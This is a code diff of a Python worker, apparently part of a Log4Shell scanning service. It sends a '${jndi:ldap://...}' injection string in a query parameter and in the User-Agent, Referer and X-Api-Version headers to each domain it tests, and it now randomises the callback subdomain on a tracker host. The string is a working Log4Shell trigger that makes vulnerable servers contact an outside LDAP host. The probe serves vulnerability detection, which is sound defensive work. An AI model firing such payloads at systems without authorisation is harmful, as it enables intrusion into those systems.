@@ -1,18 +1,19 @@
 import time
 import functools
 import json
-from requests import get
 import argparse, sys
 import logging
 import asyncio
 import os
 import signal
 import traceback
+import random
+import string
 import datetime as dt
 from operator import itemgetter
-from concurrent.futures import TimeoutError
+from concurrent.futures import TimeoutError, ProcessPoolExecutor
+from requests import get
 from nats.aio.client import Client as NATS
-from concurrent.futures import ProcessPoolExecutor
 
 logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
@@ -23,9 +24,15 @@ QUEUE_GROUP = os.getenv("QUEUE_GROUP")
 SERVERLIST = os.getenv("NATS_SERVERS")
 SERVERS = SERVERLIST.split(",")
 
+
+
+def randomword(length):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
+
 def log4shell(domain):
     try:
-        payload = "${jndi:ldap://log4shell.tracker.alpha.canada.ca:80/c=" + domain + "}"
+        payload = "${jndi:ldap://" + randomword(10) + "t.log4shell.tracker.alpha.canada.ca}"
         params = {'id':payload}
         headers = {'User-Agent':payload, 'Referer':payload, 'X-Api-Version': payload}
         print(f'Testing https://{domain}')
